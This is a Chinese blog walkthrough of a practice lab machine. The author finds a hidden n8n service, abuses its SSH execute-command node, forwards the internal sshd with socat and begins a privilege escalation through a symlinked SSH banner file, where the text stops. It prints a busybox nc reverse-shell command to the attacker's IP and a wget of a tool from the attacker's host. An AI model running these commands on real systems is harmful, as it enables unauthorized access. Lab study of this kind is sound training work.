<p>接下来有硬控了我好久好久：<br>看大佬们用<a href="https://github.com/n8n-io/n8n%E4%B8%AD%E7%9A%84ssh%E8%BF%9E%E6%8E%A5%EF%BC%8C%E6%88%91%E5%8D%A1%E4%BA%86%E5%BE%88%E4%B9%85%E3%80%82%E8%AE%B2%E8%AE%B2%E6%88%91%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B%EF%BC%9A">https://github.com/n8n-io/n8n中的ssh连接，我卡了很久。讲讲我的心路历程：</a><br>大家一起打靶机，然后发这个n8n的github地址和使用的界面，而且这个n8n还是一个工具，用法也是用docker打开，但是我从来没见过，这个靶机也没有开放22端口，我以为大佬们用这个工具来应对这种情况。而且我在本机运行这个服务的界面也是一模一样的。<br>使用方式是这样的：<br><img src="https://pic1.imgdb.cn/item/67a62298d0e0a243d4fca311.png"><br>在首页点击credentials然后add，点击添加，选择ssh私钥的选项，然后输入ip，用户名，私钥。<br>问题就来了：我始终连不上，看大佬们说用172.17.0.1，因为这个服务在docker上跑的（这里更加深了我的误解），但是我就是死活连不上，并且我一直相信是不是我的配置哪里出错了，然后就上网一直搜docker的配置，我连接不上的显示是端口拒绝连接，我也去docker内部发现没有ssh服务打开，然后整了半天，docker的内容也搜了半天，最后实在搞不下去了，就是连接不上。我就想着我自己能不能找到别的出路。<br>这时候我发现：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -p- 192.168.179.81                             </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">07</span> <span class="number">21</span>:<span class="number">31</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">179.81</span>)</span><br><span class="line">Host is up (<span class="number">0.0017</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span>   open  http</span><br><span class="line"><span class="number">5678</span><span class="symbol">/tcp</span> open  rrac</span><br><span class="line">MAC <span class="params">Address:</span> DE:<span class="number">86</span>:<span class="number">60</span>:<span class="number">02</span>:F4:<span class="number">97</span> (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2.13</span> seconds</span><br><span class="line"></span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.81 -p 5678</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">07</span> <span class="number">21</span>:<span class="number">32</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">179.81</span>)</span><br><span class="line">Host is up (<span class="number">0.0034</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">5678</span><span class="symbol">/tcp</span> open  rrac<span class="operator">?</span></span><br><span class="line">| <span class="params">fingerprint-strings:</span> </span><br><span class="line">|   <span class="params">GetRequest:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.1</span> <span class="number">200</span> OK</span><br><span class="line">|     <span class="params">Accept-Ranges:</span> bytes</span><br><span class="line">|     <span class="params">Cache-Control:</span> public, max-age<span class="operator">=</span><span class="number">86400</span></span><br><span class="line">|     <span class="params">Last-Modified:</span> Fri, <span class="number">07</span> Feb <span class="number">2025</span> <span class="number">12</span>:<span class="number">36</span>:<span class="number">13</span> GMT</span><br><span class="line">|     <span class="params">ETag:</span> W<span class="operator">/</span><span class="string">&quot;7b7-194e0691fac&quot;</span></span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span></span><br><span class="line">|     <span class="params">Content-Length:</span> <span class="number">1975</span></span><br><span class="line">|     <span class="params">Vary:</span> Accept-Encoding</span><br><span class="line">|     <span class="params">Date:</span> Fri, <span class="number">07</span> Feb <span class="number">2025</span> <span class="number">13</span>:<span class="number">32</span>:<span class="number">19</span> GMT</span><br><span class="line">|     <span class="params">Connection:</span> close</span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE html<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>html lang<span class="operator">=</span><span class="string">&quot;en&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;head&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>script type<span class="operator">=</span><span class="string">&quot;module&quot;</span> crossorigin src<span class="operator">=</span><span class="string">&quot;/assets/polyfills-DfOJfMlf.js&quot;</span><span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta charset<span class="operator">=</span><span class="string">&quot;utf-8&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta http-equiv<span class="operator">=</span><span class="string">&quot;X-UA-Compatible&quot;</span> content<span class="operator">=</span><span class="string">&quot;IE=edge&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta name<span class="operator">=</span><span class="string">&quot;viewport&quot;</span> content<span class="operator">=</span><span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>link rel<span class="operator">=</span><span class="string">&quot;icon&quot;</span> href<span class="operator">=</span><span class="string">&quot;/favicon.ico&quot;</span> <span class="operator">/</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;style&gt;</span>@media (<span class="params">prefers-color-scheme:</span> dark) &#123; body &#123; <span class="params">background-color:</span> rgb(<span class="number">45</span>, <span class="number">46</span>, <span class="number">46</span>) &#125; &#125;<span class="operator">&lt;</span><span class="operator">/</span>style<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>script type<span class="operator">=</span><span class="string">&quot;text/javascript&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     window.BASE_PATH <span class="operator">=</span> &#x27;<span class="operator">/</span>&#x27;;</span><br><span class="line">|     window.REST_ENDPOINT <span class="operator">=</span> &#x27;rest&#x27;;</span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>script src<span class="operator">=</span><span class="string">&quot;/rest/sentry.js&quot;</span><span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>script<span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;script&gt;</span><span class="operator">!</span>function(t,e)&#123;var o,n,</span><br><span class="line">|   HTTPOptions, <span class="params">RTSPRequest:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.1</span> <span class="number">404</span> Not Found</span><br><span class="line">|     <span class="params">Content-Security-Policy:</span> default-src &#x27;none&#x27;</span><br><span class="line">|     <span class="params">X-Content-Type-Options:</span> nosniff</span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>utf-<span class="number">8</span></span><br><span class="line">|     <span class="params">Content-Length:</span> <span class="number">143</span></span><br><span class="line">|     <span class="params">Vary:</span> Accept-Encoding</span><br><span class="line">|     <span class="params">Date:</span> Fri, <span class="number">07</span> Feb <span class="number">2025</span> <span class="number">13</span>:<span class="number">32</span>:<span class="number">19</span> GMT</span><br><span class="line">|     <span class="params">Connection:</span> close</span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE html<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>html lang<span class="operator">=</span><span class="string">&quot;en&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;head&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span>meta charset<span class="operator">=</span><span class="string">&quot;utf-8&quot;</span><span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;title&gt;</span>Error<span class="operator">&lt;</span><span class="operator">/</span>title<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">/</span>head<span class="operator">&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;body&gt;</span></span><br><span class="line">|     <span class="symbol">&lt;pre&gt;</span>Cannot OPTIONS <span class="operator">/</span><span class="operator">&lt;</span><span class="operator">/</span>pre<span class="operator">&gt;</span></span><br><span class="line">|     <span class="operator">&lt;</span><span class="operator">/</span>body<span class="operator">&gt;</span></span><br><span class="line">|_    <span class="operator">&lt;</span><span class="operator">/</span>html<span class="operator">&gt;</span></span><br><span class="line"><span class="number">1</span> service unrecognized despite returning data. If you know the service<span class="operator">/</span>version, please submit the following fingerprint at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>cgi-bin<span class="operator">/</span>submit.cgi<span class="operator">?</span><span class="params">new-service :</span></span><br><span class="line">SF-Port5678-TCP:V<span class="operator">=</span><span class="number">7.95</span>%I<span class="operator">=</span><span class="number">7</span>%D<span class="operator">=</span><span class="number">2</span><span class="operator">/</span><span class="number">7</span>%Time<span class="operator">=</span><span class="number">67</span>A60B63%P<span class="operator">=</span>aarch64-unknown-linux-gnu</span><br><span class="line">SF:%r(GetRequest,<span class="number">8</span>DC,<span class="string">&quot;HTTP/1<span class="char escape_">\.</span>1<span class="char escape_">\x</span>20200<span class="char escape_">\x</span>20OK<span class="char escape_">\r</span><span class="char escape_">\n</span>Accept-Ranges:<span class="char escape_">\x</span>20bytes<span class="char escape_">\r</span>\</span></span><br><span class="line"><span class="string">SF:nCache-Control:<span class="char escape_">\x</span>20public,<span class="char escape_">\x</span>20max-age=86400<span class="char escape_">\r</span><span class="char escape_">\n</span>Last-Modified:<span class="char escape_">\x</span>20Fri,<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:2007<span class="char escape_">\x</span>20Feb<span class="char escape_">\x</span>202025<span class="char escape_">\x</span>2012:36:13<span class="char escape_">\x</span>20GMT<span class="char escape_">\r</span><span class="char escape_">\n</span>ETag:<span class="char escape_">\x</span>20W/<span class="char escape_">\&quot;</span>7b7-194e0691fac\</span></span><br><span class="line"><span class="string">SF:&quot;</span>\r\nContent-Type:\x20text<span class="symbol">/html</span>;\x20charset<span class="operator">=</span>UTF-<span class="number">8</span>\r\nContent-Length:\x2</span><br><span class="line">SF:<span class="number">01975</span>\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2007\x20Feb\x202025</span><br><span class="line">SF:\x2013:<span class="number">32</span>:<span class="number">19</span>\x20GMT\r\nConnection:\x20close\r\n\r\n<span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE\x20html<span class="operator">&gt;</span>\n</span><br><span class="line">SF:<span class="operator">&lt;</span>html\x20lang<span class="operator">=</span>\<span class="string">&quot;en<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span>&lt;head&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script<span class="char escape_">\x</span>20type=<span class="char escape_">\&quot;</span>module<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20cros</span></span><br><span class="line"><span class="string">SF:sorigin<span class="char escape_">\x</span>20src=<span class="char escape_">\&quot;</span>/assets/polyfills-DfOJfMlf<span class="char escape_">\.</span>js<span class="char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="char escape_">\n</span><span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;met</span></span><br><span class="line"><span class="string">SF:a<span class="char escape_">\x</span>20charset=<span class="char escape_">\&quot;</span>utf-8<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;meta<span class="char escape_">\x</span>20http-equiv=<span class="char escape_">\&quot;</span>X-UA-Compatible</span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20content=<span class="char escape_">\&quot;</span>IE=edge<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;meta<span class="char escape_">\x</span>20name=<span class="char escape_">\&quot;</span>viewport<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20cont</span></span><br><span class="line"><span class="string">SF:ent=<span class="char escape_">\&quot;</span>width=device-width,initial-scale=1<span class="char escape_">\.</span>0<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;link<span class="char escape_">\x</span>20rel=\</span></span><br><span class="line"><span class="string">SF:&quot;</span>icon\<span class="string">&quot;<span class="char escape_">\x</span>20href=<span class="char escape_">\&quot;</span>/favicon<span class="char escape_">\.</span>ico<span class="char escape_">\&quot;</span><span class="char escape_">\x</span>20/&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;style&gt;@media<span class="char escape_">\x</span>20<span class="char escape_">\(</span>prefers</span></span><br><span class="line"><span class="string">SF:-color-scheme:<span class="char escape_">\x</span>20dark<span class="char escape_">\)</span><span class="char escape_">\x</span>20&#123;<span class="char escape_">\x</span>20body<span class="char escape_">\x</span>20&#123;<span class="char escape_">\x</span>20background-color:<span class="char escape_">\x</span>20rgb\</span></span><br><span class="line"><span class="string">SF:(45,<span class="char escape_">\x</span>2046,<span class="char escape_">\x</span>2046<span class="char escape_">\)</span><span class="char escape_">\x</span>20&#125;<span class="char escape_">\x</span>20&#125;&lt;/style&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script<span class="char escape_">\x</span>20type=<span class="char escape_">\&quot;</span>text/javas</span></span><br><span class="line"><span class="string">SF:cript<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\t</span>window<span class="char escape_">\.</span>BASE_PATH<span class="char escape_">\x</span>20=<span class="char escape_">\x</span>20&#x27;/&#x27;;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\t</span>window<span class="char escape_">\.</span>REST_ENDP</span></span><br><span class="line"><span class="string">SF:OINT<span class="char escape_">\x</span>20=<span class="char escape_">\x</span>20&#x27;rest&#x27;;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;/script&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script<span class="char escape_">\x</span>20src=<span class="char escape_">\&quot;</span>/rest/sentry\</span></span><br><span class="line"><span class="string">SF:.js<span class="char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span>&lt;script&gt;!function<span class="char escape_">\(</span>t,e<span class="char escape_">\)</span>&#123;var<span class="char escape_">\x</span>20o,n,&quot;</span>)%r(HTTPOptio</span><br><span class="line">SF:ns,<span class="number">183</span>,<span class="string">&quot;HTTP/1<span class="char escape_">\.</span>1<span class="char escape_">\x</span>20404<span class="char escape_">\x</span>20Not<span class="char escape_">\x</span>20Found<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Security-Policy:<span class="char escape_">\x</span>2</span></span><br><span class="line"><span class="string">SF:0default-src<span class="char escape_">\x</span>20&#x27;none&#x27;<span class="char escape_">\r</span><span class="char escape_">\n</span>X-Content-Type-Options:<span class="char escape_">\x</span>20nosniff<span class="char escape_">\r</span><span class="char escape_">\n</span>Content</span></span><br><span class="line"><span class="string">SF:-Type:<span class="char escape_">\x</span>20text/html;<span class="char escape_">\x</span>20charset=utf-8<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Length:<span class="char escape_">\x</span>20143<span class="char escape_">\r</span><span class="char escape_">\n</span>Vary</span></span><br><span class="line"><span class="string">SF::<span class="char escape_">\x</span>20Accept-Encoding<span class="char escape_">\r</span><span class="char escape_">\n</span>Date:<span class="char escape_">\x</span>20Fri,<span class="char escape_">\x</span>2007<span class="char escape_">\x</span>20Feb<span class="char escape_">\x</span>202025<span class="char escape_">\x</span>2013:32:19\</span></span><br><span class="line"><span class="string">SF:x20GMT<span class="char escape_">\r</span><span class="char escape_">\n</span>Connection:<span class="char escape_">\x</span>20close<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>&lt;!DOCTYPE<span class="char escape_">\x</span>20html&gt;<span class="char escape_">\n</span>&lt;html<span class="char escape_">\x</span>20lang</span></span><br><span class="line"><span class="string">SF:=<span class="char escape_">\&quot;</span>en<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;head&gt;<span class="char escape_">\n</span>&lt;meta<span class="char escape_">\x</span>20charset=<span class="char escape_">\&quot;</span>utf-8<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;title&gt;Error&lt;/title&gt;<span class="char escape_">\n</span>&lt;/</span></span><br><span class="line"><span class="string">SF:head&gt;<span class="char escape_">\n</span>&lt;body&gt;<span class="char escape_">\n</span>&lt;pre&gt;Cannot<span class="char escape_">\x</span>20OPTIONS<span class="char escape_">\x</span>20/&lt;/pre&gt;<span class="char escape_">\n</span>&lt;/body&gt;<span class="char escape_">\n</span>&lt;/html&gt;<span class="char escape_">\n</span>&quot;</span>)%</span><br><span class="line">SF:r(RTSPRequest,<span class="number">183</span>,<span class="string">&quot;HTTP/1<span class="char escape_">\.</span>1<span class="char escape_">\x</span>20404<span class="char escape_">\x</span>20Not<span class="char escape_">\x</span>20Found<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Security</span></span><br><span class="line"><span class="string">SF:-Policy:<span class="char escape_">\x</span>20default-src<span class="char escape_">\x</span>20&#x27;none&#x27;<span class="char escape_">\r</span><span class="char escape_">\n</span>X-Content-Type-Options:<span class="char escape_">\x</span>20nosniff</span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Type:<span class="char escape_">\x</span>20text/html;<span class="char escape_">\x</span>20charset=utf-8<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Length:<span class="char escape_">\x</span>20</span></span><br><span class="line"><span class="string">SF:143<span class="char escape_">\r</span><span class="char escape_">\n</span>Vary:<span class="char escape_">\x</span>20Accept-Encoding<span class="char escape_">\r</span><span class="char escape_">\n</span>Date:<span class="char escape_">\x</span>20Fri,<span class="char escape_">\x</span>2007<span class="char escape_">\x</span>20Feb<span class="char escape_">\x</span>202025<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:2013:32:19<span class="char escape_">\x</span>20GMT<span class="char escape_">\r</span><span class="char escape_">\n</span>Connection:<span class="char escape_">\x</span>20close<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>&lt;!DOCTYPE<span class="char escape_">\x</span>20html&gt;<span class="char escape_">\n</span>&lt;h</span></span><br><span class="line"><span class="string">SF:tml<span class="char escape_">\x</span>20lang=<span class="char escape_">\&quot;</span>en<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;head&gt;<span class="char escape_">\n</span>&lt;meta<span class="char escape_">\x</span>20charset=<span class="char escape_">\&quot;</span>utf-8<span class="char escape_">\&quot;</span>&gt;<span class="char escape_">\n</span>&lt;title&gt;Error&lt;</span></span><br><span class="line"><span class="string">SF:/title&gt;<span class="char escape_">\n</span>&lt;/head&gt;<span class="char escape_">\n</span>&lt;body&gt;<span class="char escape_">\n</span>&lt;pre&gt;Cannot<span class="char escape_">\x</span>20OPTIONS<span class="char escape_">\x</span>20/&lt;/pre&gt;<span class="char escape_">\n</span>&lt;/body&gt;<span class="char escape_">\n</span>&lt;</span></span><br><span class="line"><span class="string">SF:/html&gt;<span class="char escape_">\n</span>&quot;</span>);</span><br><span class="line">MAC <span class="params">Address:</span> DE:<span class="number">86</span>:<span class="number">60</span>:<span class="number">02</span>:F4:<span class="number">97</span> (Unknown)</span><br><span class="line"><span class="params">Warning:</span> OSScan results may be unreliable because we could not find at least <span class="number">1</span> open and <span class="number">1</span> closed port</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">3.41</span> ms bogon (<span class="number">192.168</span>.<span class="number">179.81</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">13.35</span> seconds</span><br></pre></td></tr></table></figure></div>

<p>我发现wc这不是藏了一个端口吗，而且还有http服务，我一访问，结果就是这个n8n<br>所以一直不是我的n8n配置啥的出问题了，因为这个是靶机的n8n!!!!<br>所以我就是看聊天记录就先入为主了，自己信息收集的还不完整，吃个教训了 <br><br>然后按图中输入就可以连接成功了<br><img src="https://pic1.imgdb.cn/item/67a6229bd0e0a243d4fca313.png"><br>接着去workflow中 配置下，第二个节点选ssh执行命令<br><img src="https://pic1.imgdb.cn/item/67a6229cd0e0a243d4fca314.png"><br>双击这个ssh就可以进入执行命令了<br><img src="https://pic1.imgdb.cn/item/67a62297d0e0a243d4fca310.png"><br>但是直接用nc命令不行，提醒我们要用busybox ， busybox就是整合了一系列linux工具的小集合<br>执行的命令为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">busybox</span> nc <span class="number">192.168.179.11</span> <span class="number">1234</span> -e /bin/sh</span><br></pre></td></tr></table></figure></div>
<p>成功拿到webshell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>现在的问题是这个shell不稳定，要得到一个稳定的shell<br>用群主的方法 利用socat转发端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># python3 -m http.server 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port<span class="number"> 80 </span>(http://0.0.0.0:80/) ...</span><br><span class="line"></span><br><span class="line">cd /tmp  </span><br><span class="line">wget 192.168.179.11/socat</span><br><span class="line">ls -al</span><br><span class="line">total 372</span><br><span class="line">drwxrwxrwt   <span class="number"> 4 </span>root     root          <span class="number"> 100 </span>Feb <span class="number"> 7 </span>14:56 .</span><br><span class="line">drwxr-xr-x  <span class="number"> 21 </span>root     root         <span class="number"> 4096 </span>Feb <span class="number"> 6 </span>10:03 ..</span><br><span class="line">drwxrwxrwt   <span class="number"> 2 </span>root     root           <span class="number"> 40 </span>Feb <span class="number"> 7 </span>12:35 .ICE-unix</span><br><span class="line">drwxrwxrwt   <span class="number"> 2 </span>root     root           <span class="number"> 40 </span>Feb <span class="number"> 7 </span>12:35 .X11-unix</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>shawa    shawa      <span class="number"> 375176 </span>Feb <span class="number"> 7 </span>14:56 socat</span><br><span class="line">chmod +x socat</span><br><span class="line">./socat TCP-LISTEN:2222,fork TCP4:172.17.0.1:22 &amp;</span><br><span class="line">busybox netstat -lntup</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>172.17.0.1:22           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>0.0.0.0:2222            0.0.0.0:*               LISTEN      3105/socat</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>0.0.0.0:5678            0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>:::5678                 :::*                    LISTEN      -</span><br><span class="line">tcp       <span class="number"> 0 </span>    <span class="number"> 0 </span>:::80                   :::*                    LISTEN      -</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后就可以用ssh和私钥连接了 拿到稳定shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="meta"># ssh shawa<span class="comment">@192.168.179.81 -i tmp -p 2222</span></span></span><br><span class="line"><span class="comment"><span class="meta">The authenticity of host &#x27;[192.168.179.81]:2222 ([192.168.179.81]:2222)&#x27; can&#x27;t be established.</span></span></span><br><span class="line"><span class="comment"><span class="meta">ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.</span></span></span><br><span class="line"><span class="comment"><span class="meta">This key is not known by any other names.</span></span></span><br><span class="line"><span class="comment"><span class="meta">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span></span><br><span class="line"><span class="comment"><span class="meta">Warning: Permanently added &#x27;[192.168.179.81]:2222&#x27; (ED25519) to the list of known hosts.</span></span></span><br><span class="line"><span class="comment"><span class="meta">shawa was here.</span></span></span><br><span class="line"><span class="comment"><span class="meta">Welcome to Alpine!</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">The Alpine Wiki contains a large amount of how-to guides and general</span></span></span><br><span class="line"><span class="comment"><span class="meta">information about administrating Alpine systems.</span></span></span><br><span class="line"><span class="comment"><span class="meta">See &lt;https://wiki.alpinelinux.org/&gt;.</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">You can setup the system with the command: setup-alpine</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">You may change this message by editing /etc/motd.</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br><span class="line"><span class="comment"><span class="meta">hero:~$ </span></span></span><br></pre></td></tr></table></figure></div>
<p>sudo 和 suid没有啥可以用上的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">hero:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">-sh: <span class="built_in">sudo</span>: not found</span><br><span class="line">hero:~$ find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">/bin/bbsuid</span><br><span class="line">hero:~$ </span><br></pre></td></tr></table></figure></div>
<p>经过群里大佬们提醒，提权用ssh的banner找到sshd配置文件中的banner位置</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">no</span> <span class="keyword">default</span> banner <span class="type">path</span></span><br><span class="line">Banner /opt/banner.txt </span><br></pre></td></tr></table></figure></div>
<p>做一个软链接</p>
